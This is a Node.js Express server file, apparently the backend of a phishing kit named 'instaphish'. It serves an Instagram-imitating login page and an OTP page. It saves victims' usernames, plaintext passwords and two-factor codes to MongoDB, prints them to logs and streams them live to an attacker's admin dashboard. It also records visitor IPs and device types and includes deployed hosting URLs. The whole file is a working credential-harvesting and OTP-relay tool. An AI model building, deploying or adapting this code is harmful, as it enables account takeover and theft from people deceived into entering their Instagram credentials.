const path = require('path');
const http = require('http');
const express = require('express');
const mongoose = require('mongoose');
const dotenv = require('dotenv');
const session = require('express-session');
const bcrypt = require('bcryptjs');
const { Server } = require('socket.io');
const crypto = require('crypto');

dotenv.config({ path: path.join(__dirname, '.env') });

const app = express();
const server = http.createServer(app);
const BACKEND_URL = process.env.BACKEND_URL || 'https://instaphish-2nrr.onrender.com';
const OTP_PAGE_URL = process.env.OTP_PAGE_URL || '/otp';
const FRONTEND_URLS = [
  'https://phishingback.vercel.app',
  'https://instaphish-eta.vercel.app',
  BACKEND_URL,
];

const io = new Server(server, {
  cors: {
    origin: FRONTEND_URLS,
    credentials: true,
  },
});

const staticDir = path.join(__dirname, '..', 'instagram-ui');
const otpStaticDir = path.join(__dirname, '..', 'otp-ui');
const PORT = process.env.PORT || 3000;
const mongoUri = process.env.MONGODB_URI;
const mongoDbName = process.env.MONGODB_DB || undefined;

function getOtpRedirectUrl(sessionId) {
  const target = OTP_PAGE_URL;
  const url = target.startsWith('http') ? new URL(target) : new URL(target, BACKEND_URL);
  if (sessionId) {
    url.searchParams.set('sessionId', sessionId);
  }
  return url.toString();
}

if (!mongoUri) {
  console.error('MONGODB_URI is not set in .env');
  process.exit(1);
}

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (FRONTEND_URLS.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PUT,PATCH,DELETE,OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  }
  if (req.method === 'OPTIONS') {
    return res.sendStatus(204);
  }
  next();
});
app.use(session({
  secret: process.env.SESSION_SECRET || 'change_this_secret',
  resave: false,
  saveUninitialized: false,
  cookie: { httpOnly: true },
}));
app.use(express.static(staticDir));
app.use('/admin-static', express.static(path.join(__dirname, 'admin')));

mongoose
  .connect(mongoUri, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
    dbName: mongoDbName,
  })
  .then(() => console.log('Connected to MongoDB'))
  .catch((error) => {
    console.error('MongoDB connection error:', error);
    process.exit(1);
  });

const credentialSchema = new mongoose.Schema({
  username: { type: String, required: true },
  password: { type: String, required: true },
  sessionId: { type: String, required: false },
  createdAt: { type: Date, default: Date.now },
});

const otpSchema = new mongoose.Schema({
  code: { type: String, required: true },
  sessionId: { type: String, required: false },
  createdAt: { type: Date, default: Date.now },
});

const accessSchema = new mongoose.Schema({
  ip: { type: String, required: true },
  device: { type: String, required: true },
  path: { type: String, required: true },
  message: { type: String, required: true },
  createdAt: { type: Date, default: Date.now },
});

const detailSchema = new mongoose.Schema({
  name: { type: String, required: true },
  value: { type: String, required: true },
  createdAt: { type: Date, default: Date.now },
});

const Credential = mongoose.model('Credential', credentialSchema);
const Otp = mongoose.model('Otp', otpSchema);
const Access = mongoose.model('Access', accessSchema);
const Detail = mongoose.model('Detail', detailSchema);

const adminSchema = new mongoose.Schema({
  username: { type: String, required: true },
  passwordHash: { type: String, required: true },
});

const Admin = mongoose.model('Admin', adminSchema);

async function ensureAdminUser() {
  const username = process.env.ADMIN_USER || 'admin';
  const password = process.env.ADMIN_PASS || 'Admin@123';
  let admin = await Admin.findOne();
  if (!admin) {
    const passwordHash = await bcrypt.hash(password, 10);
    admin = await Admin.create({ username, passwordHash });
    console.log('Created default admin user:', username);
  }
  return admin;
}

function adminAuth(req, res, next) {
  if (req.session && req.session.isAdmin) {
    return next();
  }
  return res.redirect('/admin/login');
}

async function getAdmin() {
  return Admin.findOne().lean();
}

function getClientIp(req) {
  const forwarded = req.headers['x-forwarded-for'] || req.headers['x-real-ip'];
  const ip = forwarded ? forwarded.split(',')[0].trim() : req.socket.remoteAddress;
  return ip ? ip.replace('::ffff:', '') : 'Unknown';
}

function getDeviceType(userAgent) {
  if (!userAgent) return 'Unknown';
  const ua = userAgent.toLowerCase();
  if (/mobile|iphone|android/.test(ua)) return 'Mobile';
  if (/ipad|tablet/.test(ua)) return 'Tablet';
  if (/windows|macintosh|linux/.test(ua)) return 'Desktop';
  return 'Other';
}

async function logAccessEvent(req, message) {
  try {
    const ip = getClientIp(req);
    const device = getDeviceType(req.headers['user-agent']);
    const access = await Access.create({
      ip,
      device,
      path: req.path,
      message,
    });
    console.log('Access event:', access);
    io.emit('userOnline', access);
    return access;
  } catch (error) {
    console.error('Error logging access event:', error);
    return null;
  }
}

async function logCurrentLoginAndOtp() {
  try {
    const credentials = await Credential.find().sort({ createdAt: -1 }).limit(10).lean();
    const otps = await Otp.find().sort({ createdAt: -1 }).limit(10).lean();

    console.log('--- Current saved credentials ---');
    console.log(JSON.stringify(credentials, null, 2));
    console.log('--- Current saved OTPs ---');
    console.log(JSON.stringify(otps, null, 2));
  } catch (error) {
    console.error('Error fetching saved data:', error);
  }
}

app.post('/detail', async (req, res) => {
  try {
    const { name, value } = req.body;
    if (!name || !value) {
      return res.status(400).send('Missing required fields');
    }

    const savedDetail = await Detail.create({ name, value });
    console.log('Saved Detail:', savedDetail);
    return res.status(200).send('Detail saved successfully');
  } catch (error) {
    console.error('Error saving detail data:', error);
    return res.status(500).send('Unable to save detail');
  }
});

app.get('/admin/data', adminAuth, async (req, res) => {
  try {
    const credentials = await Credential.find().sort({ createdAt: -1 }).lean();
    const otps = await Otp.find().sort({ createdAt: -1 }).lean();
    const accesses = await Access.find().sort({ createdAt: -1 }).lean();
    return res.json({ credentials, otps, accesses });
  } catch (error) {
    console.error('Error fetching admin data:', error);
    return res.status(500).json({ error: 'Unable to fetch admin data' });
  }
});

app.post('/admin/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    const admin = await Admin.findOne();
    if (!admin) {
      return res.redirect('/admin/login?error=missing');
    }
    const valid = await bcrypt.compare(password, admin.passwordHash);
    if (!valid || username !== admin.username) {
      return res.redirect('/admin/login?error=invalid');
    }
    req.session.isAdmin = true;
    req.session.adminUser = admin.username;
    return res.redirect('/admin');
  } catch (error) {
    console.error('Admin login error:', error);
    return res.redirect('/admin/login?error=server');
  }
});

app.post('/admin/update-admin', adminAuth, async (req, res) => {
  try {
    const { username, password } = req.body;
    const admin = await Admin.findOne();
    if (!admin) return res.status(500).json({ error: 'Admin missing' });
    if (username) admin.username = username;
    if (password) admin.passwordHash = await bcrypt.hash(password, 10);
    await admin.save();
    return res.json({ ok: true, username: admin.username });
  } catch (error) {
    console.error('Error updating admin user:', error);
    return res.status(500).json({ error: 'Unable to update admin user' });
  }
});

app.delete('/admin/delete/:type/:id', adminAuth, async (req, res) => {
  try {
    const { type, id } = req.params;
    let Model;
    if (type === 'credential') Model = Credential;
    else if (type === 'otp') Model = Otp;
    else if (type === 'access') Model = Access;
    else return res.status(400).json({ error: 'Unknown type' });

    const deleted = await Model.findByIdAndDelete(id).lean();
    if (!deleted) return res.status(404).json({ error: 'Not found' });

    io.emit('deleted', { type, id });
    console.log(`Deleted ${type}:`, id);
    return res.json({ ok: true });
  } catch (error) {
    console.error('Error deleting admin record:', error);
    return res.status(500).json({ error: 'Unable to delete' });
  }
});

app.post('/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) {
      return res.redirect('/');
    }

    await logAccessEvent(req, 'User submitted login credentials');
    const sessionId = crypto.randomUUID();
    const savedCredential = await Credential.create({ username, password, sessionId });
    console.log('Saved login detail:', savedCredential);
    io.emit('loginSaved', savedCredential);
    await logCurrentLoginAndOtp();
    return res.redirect(getOtpRedirectUrl(sessionId));
  } catch (error) {
    console.error('Error saving login data:', error);
    return res.redirect(getOtpRedirectUrl());
  }
});

app.post('/otp', async (req, res) => {
  try {
    const { code, sessionId } = req.body;
    if (!code) {
      return res.redirect(getOtpRedirectUrl());
    }

    await logAccessEvent(req, 'User submitted OTP');
    const savedOtp = await Otp.create({ code, sessionId });
    console.log('Saved OTP detail:', savedOtp);
    io.emit('otpSaved', savedOtp);
    await logCurrentLoginAndOtp();
    return res.redirect('/');
  } catch (error) {
    console.error('Error saving OTP data:', error);
    return res.redirect('/otp');
  }
});

app.get('/', async (req, res) => {
  await logAccessEvent(req, 'User opened login page');
  res.sendFile(path.join(staticDir, 'index.html'));
});

app.get('/otp', async (req, res) => {
  await logAccessEvent(req, 'User opened OTP page');
  res.sendFile(path.join(otpStaticDir, 'otp.html'));
});

app.get('/admin/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin', 'login.html'));
});

app.get('/admin/logout', (req, res) => {
  req.session.destroy(() => {
    res.redirect('/admin/login');
  });
});

app.get('/admin', adminAuth, (req, res) => {
  res.sendFile(path.join(__dirname, 'admin', 'index.html'));
});

server.listen(PORT, async () => {
  await ensureAdminUser();
  console.log(`Server running on http://localhost:${PORT}`);
});
